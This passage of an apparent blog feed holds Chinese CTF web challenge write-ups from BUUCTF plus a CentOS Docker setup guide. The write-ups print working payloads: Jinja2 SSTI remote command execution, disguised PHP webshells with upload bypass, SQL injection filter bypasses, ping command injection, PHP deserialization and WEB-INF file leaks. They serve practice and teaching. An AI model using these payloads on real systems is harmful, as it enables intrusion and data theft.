action经过加密后与sign相同</p><p>其中action要包含read和scan</p><p>param是flag.txt</p><p>剩下的secert_key值我们还缺少，但是在/geneSign路由中，是能够得到正确的sign值的</p><p>/geneSign?param=flag.txtread得到c46a0b9db5c9a1f327f170ff8e185676</p><p>然后/De1ta?param=flag.txt</p><p>Cookie: action=readscan;sign=c46a0b9db5c9a1f327f170ff8e185676</p><p><img data-action="zoom" src="/2020/07/21/De1CTF2019-SSRFME/2.png" alt="2"></p><p>参考文章：<a href="https://blog.csdn.net/weixin_43900387/article/details/105278192" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43900387/article/details/105278192</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="刷题记录" scheme="https://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="web" scheme="https://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>RoarCTF2019-EasyJava</title>
    <link href="https://lingxin16.github.io/2020/07/14/RoarCTF2019-EasyJava/"/>
    <id>https://lingxin16.github.io/2020/07/14/RoarCTF2019-EasyJava/</id>
    <published>2020-07-14T02:01:00.000Z</published>
    <updated>2020-07-15T09:44:44.795Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img data-action="zoom" src="/2020/07/14/RoarCTF2019-EasyJava/1.png" alt="1"></p><p>这道题做起来又是没有一点思路，除了登录和help两个功能也没找到其他的，也没有隐藏的hint之类的，看报错显示的是Apache Tomcat/8.5.24，我搜下了有一个CVE-2018-1305的漏洞，但是好像也没什么用，还是看大佬们的wp吧😭😭😭</p><p>利用点是help功能，点击help之后跳转的是/Download?filename=help.docx，但是报错<code>java.io.FileNotFoundException:{help.docx}</code></p><p>关于这点，看大佬们的博客是因为请求方式的原因，果然改为post请求之后能够正常下载</p><p><img data-action="zoom" src="/2020/07/14/RoarCTF2019-EasyJava/2.png" alt="2"></p><p>下载后打开只有一行Are you sure the flag is here? ? ?很显然这也不是flag</p><p>接下来就是WEB-INF/web.xml泄露，WEB-INF是Java的WEB应用的安全目录。主要包含以下文件或目录</p><pre><code>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。/WEB-INF/database.properties：数据库配置文件漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</code></pre><p>关于具体的源码泄露参考这个大佬的文章：<a href="https://blog.csdn.net/wy_97/article/details/78165051" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/78165051</a></p><p>然后传filename=/WEB-INF/web.xml，下载得到</p><p><img data-action="zoom" src="/2020/07/14/RoarCTF2019-EasyJava/3.png" alt="3"></p><p>有一个FlagController，路径/Flag，请求后报错</p><p><img data-action="zoom" src="/2020/07/14/RoarCTF2019-EasyJava/4.png" alt="4"></p><p>有路径/com/wm/ctf/FlagController</p><p>接下来就是更加看不懂的环节了，推测class文件路径，然后获得class文件，反编译得到flag</p><p>payload：</p><pre><code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code></pre><p><img data-action="zoom" src="/2020/07/14/RoarCTF2019-EasyJava/5.png" alt="5"></p><p>有一串base64样式的字符串，解码得到flag</p><p>关于这个路径推测，大佬们的博客写的是结合Tomcat的项目存放路径的经验得出的，咱也没经验，咱也不知道👀</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="刷题记录" scheme="https://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="web" scheme="https://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>BJDCTF2nd-EasyMd5</title>
    <link href="https://lingxin16.github.io/2020/07/13/BJDCTF2nd-EasyMd5/"/>
    <id>https://lingxin16.github.io/2020/07/13/BJDCTF2nd-EasyMd5/</id>
    <published>2020-07-13T02:51:00.000Z</published>
    <updated>2020-07-15T09:45:04.855Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img data-action="zoom" src="/2020/07/13/BJDCTF2nd-EasyMd5/1.png" alt="1"></p><p>在HTTP头里发现Hint: select * from ‘admin’ where password=md5($pass,true)</p><p>关于md5($pass,true)</p><p>参考：<a href="https://blog.csdn.net/March97/article/details/81222922" target="_blank" rel="noopener">https://blog.csdn.net/March97/article/details/81222922</a></p><p>输入ffifdyop</p><p><img data-action="zoom" src="/2020/07/13/BJDCTF2nd-EasyMd5/2.png" alt="2"></p><p>查看源文件，发现</p><pre><code>&lt;!--$a = $GET[&#39;a&#39;];$b = $_GET[&#39;b&#39;];if($a != $b &amp;&amp; md5($a) == md5($b)){    // wow, glzjin wants a girl friend.--&gt;</code></pre><p>md5 bypass</p><p>因为<code>md5()</code>或者<code>sha1()</code>之类的函数计算的是一个字符串的哈希值，对于数组则返回false，如果<code>$a</code>和<code>$b</code>都是数组则双双返回FALSE, 两个FALSE相等得以绕过。payload:<code>?a[]=1&amp;b[]=2</code></p><p><img data-action="zoom" src="/2020/07/13/BJDCTF2nd-EasyMd5/3.png" alt="3"></p><p>POST方式传<code>?param1[]=1&amp;param2[]=2</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="刷题记录" scheme="https://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="web" scheme="https://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>BJDCTF2nd-fakegoogle</title>
    <link href="https://lingxin16.github.io/2020/07/13/BJDCTF2nd-fakegoogle/"/>
    <id>https://lingxin16.github.io/2020/07/13/BJDCTF2nd-fakegoogle/</id>
    <published>2020-07-13T00:32:00.000Z</published>
    <updated>2020-07-15T09:45:20.383Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img data-action="zoom" src="/2020/07/13/BJDCTF2nd-fakegoogle/1.png" alt="1"></p><p>输入一个值之后返回</p><p><img data-action="zoom" src="/2020/07/13/BJDCTF2nd-fakegoogle/2.png" alt="2"></p><p>查看源文件后发现提示</p><pre><code>&lt;!--ssssssti &amp; a little trick --&gt; </code></pre><p>ssti注入，利用的是jinjia2的模板引擎</p><p>payload</p><pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag').read()") }}{% endif %}{% endfor %}```RCE Payload```{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('<command>').read()") }}{% endif %}{% endfor %}</code></pre><p>推荐文章<a href="https://bbs.ichunqiu.com/thread-47685-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-47685-1-1.html</a></p><p>当然这一题也能用tplmap一把梭</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="刷题记录" scheme="https://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="web" scheme="https://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ACTF2020新生赛-Upload</title>
    <link href="https://lingxin16.github.io/2020/07/11/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/"/>
    <id>https://lingxin16.github.io/2020/07/11/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/</id>
    <published>2020-07-11T01:35:00.000Z</published>
    <updated>2020-07-15T09:45:38.595Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img data-action="zoom" src="/2020/07/11/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/1.png" alt="1"></p><p>鼠标移动到中间发现上传，尝试上传</p><p><img data-action="zoom" src="/2020/07/11/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/2.png" alt="2"></p><p>上传成功后左上角有提示，可以打开</p><p>在尝试上传PHP马的时候提示</p><p><img data-action="zoom" src="/2020/07/11/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/3.png" alt="3"></p><p>在尝试抓包的时候发现，文件后缀的检测是本地前端检测，后缀改为png，利用burp抓包改phtml后缀，上传成功。</p><p>蚁剑连接，在根目录找到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="刷题记录" scheme="https://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="web" scheme="https://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ACTF2020新生赛-BackupFile</title>
    <link href="https://lingxin16.github.io/2020/07/10/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile/"/>
    <id>https://lingxin16.github.io/2020/07/10/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile/</id>
    <published>2020-07-10T02:49:00.000Z</published>
    <updated>2020-07-15T09:45:51.760Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img data-action="zoom" src="/2020/07/10/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile/1.png" alt="1"></p><p>让我们尝试找源文件，在index.php.bak得到源文件</p><pre><code>&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET[&#39;key&#39;])) {    $key = $_GET[&#39;key&#39;];    if(!is_numeric($key)) {        exit(&quot;Just num!&quot;);    }    $key = intval($key);    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;    if($key == $str) {        echo $flag;    }}else {    echo &quot;Try to find out source file!&quot;;}</code></pre><p>要求我们传入key值，key值只能是数字，并且key值等于123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3才能得到flag</p><p>PHP作为弱类型语言，当字符串与整型值比较时，字符串先转换成整型，然后再比较，也就是说只要key=123就能满足。</p><p>index.php?key=123得到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="刷题记录" scheme="https://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="web" scheme="https://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战2019-upload</title>
    <link href="https://lingxin16.github.io/2020/07/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-upload/"/>
    <id>https://lingxin16.github.io/2020/07/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-upload/</id>
    <published>2020-07-09T02:45:00.000Z</published>
    <updated>2020-07-15T09:46:36.176Z</updated>
    
    <content type="html"><![CDATA[<p>地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img data-action="zoom" src="/2020/07/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-upload/1.png" alt="1"></p><p>上传界面</p><p><img data-action="zoom" src="/2020/07/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-upload/2.png" alt="2"></p><p>过滤了<code>&lt;?</code>那就尝试不带<code>&lt;?</code>的，前几天遇到过</p><script language="php">eval($_POST[a]);</script><p><img data-action="zoom" src="/2020/07/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-upload/3.png" alt="3"></p><p>还要满足图片，</p><pre><code>GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_POST[a]);&lt;/script&gt;</code></pre><p>PHP后缀的话可以用PHP3、PHP4、phtml绕过，这里只能用phtml</p><p>上传文件都在upload目录下，蚁剑连接，在根目录下得到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="刷题记录" scheme="https://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="web" scheme="https://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ZJCTF-NiZhuanSiWei</title>
    <link href="https://lingxin16.github.io/2020/07/08/ZJCTF-NiZhuanSiWei/"/>
    <id>https://lingxin16.github.io/2020/07/08/ZJCTF-NiZhuanSiWei/</id>
    <published>2020-07-08T07:42:00.000Z</published>
    <updated>2020-07-15T10:02:44.660Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img data-action="zoom" src="/2020/07/08/ZJCTF-NiZhuanSiWei/1.png" alt="1"></p><p>首先要满足传入一个text文件，使文件内容为welcome to the zjctf，可以用php://input伪协议</p><pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></pre><p>接下来过滤了flag，并且提示有个useless.php文件，使用php://filter协议读取</p><pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></pre><p><img data-action="zoom" src="/2020/07/08/ZJCTF-NiZhuanSiWei/2.png" alt="2"></p><p>base64解码得道useless.php的内容</p><pre><code>&lt;?php  class Flag{  //flag.php      public $file;      public function __tostring(){          if(isset($this-&gt;file)){              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);        }      }  }  ?&gt;  </code></pre><p>然后序列化</p><pre><code>&lt;?php  class Flag{    public $file=&#39;flag.php&#39;;      public function __tostring(){          if(isset($this-&gt;file)){              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);        }      }  } $password=new Flag();$password = serialize($password);echo $password; ?&gt;</code></pre><p>得到<code>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p><p>最终payload</p><pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></pre><p>源代码得到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="刷题记录" scheme="https://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="web" scheme="https://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战2019-BuyFlag</title>
    <link href="https://lingxin16.github.io/2020/07/07/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/"/>
    <id>https://lingxin16.github.io/2020/07/07/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/</id>
    <published>2020-07-07T12:58:00.000Z</published>
    <updated>2020-07-15T09:47:18.695Z</updated>
    
    <content type="html"><![CDATA[<p>地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img data-action="zoom" src="/2020/07/07/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/1.png" alt="1"></p><p>随便翻一翻，右边menu菜单有个PayFlag指向pay.php</p><p><img data-action="zoom" src="/2020/07/07/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/2.png" alt="2"></p><p>这里说我们只能用多少钱买flag并且必须是哪里的学生，并且要回答正确的密码</p><p>查看源代码发现提示</p><pre><code>&lt;!--    ~~~post money and password~~~if (isset($_POST[&#39;password&#39;])) {    $password = $_POST[&#39;password&#39;];    if (is_numeric($password)) {        echo &quot;password can&#39;t be number&lt;/br&gt;&quot;;    }elseif ($password == 404) {        echo &quot;Password Right!&lt;/br&gt;&quot;;    }}--&gt;</code></pre><p>这里的意思是我们需要用post方式提交password，然后password不能是数字，当password等于404的时候返回Password Right!</p><p>emm既需要满足password不是数字，又要满足password等于404</p><p>这里的password类型判断用的is_numeric()</p><p>在PHP手册中了解到</p><pre><code>bool is_numeric( mixed $var)如果 var 是数字和数字字符串则返回 TRUE，否则返回 FALSE。 </code></pre><p>那么如果我们赋值中不仅仅是数字或数字字符串，就是false</p><p>这里我们让password=404%</p><p>在控制台中还能看到一项cookie：user=0</p><p>修改为user=1</p><p><img data-action="zoom" src="/2020/07/07/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/3.png" alt="3"></p><p>已经提示我们<br>you are Cuiter<br>Password Right!<br>Pay for the flag!!!hacker!!!</p><p>但是Pay for the flag一直没找到在哪里，那就也直接传一个money吧</p><p>但是在这个题中PHP版本是5.3.5，输入字符不能超过八位，否则会提示我们Nember lenth is too long</p><p>关于这个我们可以了解一下strcmp()函数</p><p><img data-action="zoom" src="/2020/07/07/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/4.png" alt="4"></p><p>这个函数在PHP5.3版本之前有个漏洞，当我们传入非字符串类型的数据的时候，这个函数将发生错误，在PHP5.3版本之前显示了报错的警告信息后会return 0，也就是虽然报了错，但却判定其相等。</p><p>所以我们传money[]=admin</p><p><img data-action="zoom" src="/2020/07/07/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/5.png" alt="5"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="刷题记录" scheme="https://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="web" scheme="https://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战2019-BabySQL</title>
    <link href="https://lingxin16.github.io/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/"/>
    <id>https://lingxin16.github.io/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/</id>
    <published>2020-07-06T03:23:00.000Z</published>
    <updated>2020-07-15T09:47:29.734Z</updated>
    
    <content type="html"><![CDATA[<p>​    题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img data-action="zoom" src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/1.png" alt="1"></p><p>尝试admin登录</p><p><img data-action="zoom" src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/2.png" alt="2"></p><p>然后尝试利用admin’or 1 = 1#</p><p><img data-action="zoom" src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/3.png" alt="3"></p><p>显然or被过滤了，</p><p>这里用双写绕过admin’oorr 1 = 1#成功</p><p><img data-action="zoom" src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/4.png" alt="4"></p><p>username=u’uniunionon selselectect 1,2,3#&amp;password=p</p><p><img data-action="zoom" src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/5.png" alt="5"></p><p>得到2,3列，接下来爆库得到geek</p><p>u’uniunionon selselectect 1,2,database()#&amp;password=p</p><p><img data-action="zoom" src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/6.png" alt="6"></p><p>username=u’uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()#&amp;password=p</p><p>得到两个表名’b4bsql,geekuser’</p><p><img data-action="zoom" src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/7.png" alt="7"></p><p>username=u’uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=’geekuser’#&amp;password=p</p><p>得到三个字段id,username,password</p><p><img data-action="zoom" src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/8.png" alt="8"></p><p>username=u’uniunionon selselectect 1,2,group_concat(id,username,passwoorrd) frfromom geekuser#&amp;password=p</p><p><img data-action="zoom" src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/9.png" alt="9"></p><p>没有发现flag</p><p>重复操作在b4bsql表中发现flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;​    题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="刷题记录" scheme="https://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="web" scheme="https://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>CentOS配置docker和docker-compose</title>
    <link href="https://lingxin16.github.io/2020/06/25/CentOS%E9%85%8D%E7%BD%AEdocker%E5%92%8Cdocker-compose/"/>
    <id>https://lingxin16.github.io/2020/06/25/CentOS%E9%85%8D%E7%BD%AEdocker%E5%92%8Cdocker-compose/</id>
    <published>2020-06-25T13:48:00.000Z</published>
    <updated>2020-07-15T09:47:48.916Z</updated>
    
    <content type="html"><![CDATA[<p>最近在部署一个web服务，需要docker和docker-compose，遇到了许多问题，记录一下。</p><a id="more"></a><p>CentOS版本是7.6</p><p>先安装docker</p><pre><code>yum -y install docker</code></pre><p>然后安装docker-compose(可能会出现错误，建议先看完整篇博客再安装)</p><pre><code># yum-util 提供 yum-config-manager 功能， 另外两个是 devicemapper 驱动依赖yum install -y yum-utils device-mapper-persistent-data lvm2# 设置 yum 源yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo# 安装依赖yum install epel-release#安装python——pipyum install -y python-pip# 使用pip安装docker-composepip install docker-compose# 升级python包sudo yum upgrade python*</code></pre><p>这是正常的流程，会出现这样的错误</p><p><img data-action="zoom" src="/2020/06/25/CentOS%E9%85%8D%E7%BD%AEdocker%E5%92%8Cdocker-compose/1.png" alt="1"></p><p>那么需要先安装安装python-devel</p><pre><code>yum install python-devel -y </code></pre><p>然后再安装上边的使用pip安装docker-compose</p><p>安装成功之后测试</p><pre><code>docker -vdocker-compose -v</code></pre><p>正常之后就没问题了</p><p>但是我的docker-compose出现了这样的错误</p><p><img data-action="zoom" src="/2020/06/25/CentOS%E9%85%8D%E7%BD%AEdocker%E5%92%8Cdocker-compose/2.png" alt="2"></p><p>这个问题我也没什么解决办法，就换一种方法安装docker-compose</p><p>安装docker-compose</p><pre><code>sudo curl -L &quot;https://get.daocloud.io/docker/compose/releases/download/1.24.1/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose</code></pre><p>对二进制文件应用可执行权限：</p><pre><code>chmod +x /usr/local/bin/docker-compose</code></pre><p>然后再<code>docker-compose -v</code>测试是否正常</p><p>如果提示找不到docker-compose，那就配置一下全局环境变量，具体操作在下边</p><pre><code>vi /etc/profile</code></pre><p>然后在末尾添加</p><pre><code>export PATH=/usr/local/bin:$PATH</code></pre><p>最后退出vim</p><p>执行<code>source/etc/profile</code></p><p>这时候测试应该就正常了</p><p>但是在用docker-compose启动docker集群时报错Couldn’t connect to Docker daemon at http+docker://localunixsocket - is it running?</p><p>执行<code>systemctl start docker</code></p><p>然后再启动docker集群解决问题</p><p>参考文章:</p><p><a href="https://blog.csdn.net/btqszl/article/details/78528726" target="_blank" rel="noopener">https://blog.csdn.net/btqszl/article/details/78528726</a></p><p><a href="https://www.cnblogs.com/caidingyu/p/11320021.html" target="_blank" rel="noopener">https://www.cnblogs.com/caidingyu/p/11320021.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在部署一个web服务，需要docker和docker-compose，遇到了许多问题，记录一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="技术学习" scheme="https://lingxin16.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="环境配置" scheme="https://lingxin16.github.io/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>ACTF2020新生赛-Exec</title>
    <link href="https://lingxin16.github.io/2020/06/22/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/"/>
    <id>https://lingxin16.github.io/2020/06/22/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/</id>
    <published>2020-06-22T01:57:00.000Z</published>
    <updated>2020-07-15T09:47:59.766Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址：<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>题目是长这样子的</p><p><img data-action="zoom" src="/2020/06/22/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/1.png" alt="1"></p><p>emm..看到ping这个功能就想命令执行和管道符漏洞，就先输入127.0.0.1||ls</p><p><img data-action="zoom" src="/2020/06/22/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/2.png" alt="2"></p><p>但是只能看到一个index.php</p><p>再看上级目录127.0.0.1||ls /</p><p><img data-action="zoom" src="/2020/06/22/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/3.png" alt="3"></p><p>然后直接127.0.0.1||cat /flag</p><p><img data-action="zoom" src="/2020/06/22/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/4.png" alt="4"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址：&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="刷题记录" scheme="https://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="web" scheme="https://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯2018-Fakebook</title>
    <link href="https://lingxin16.github.io/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/"/>
    <id>https://lingxin16.github.io/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/</id>
    <published>2020-06-20T14:27:00.000Z</published>
    <updated>2020-07-15T09:48:16.193Z</updated>
    
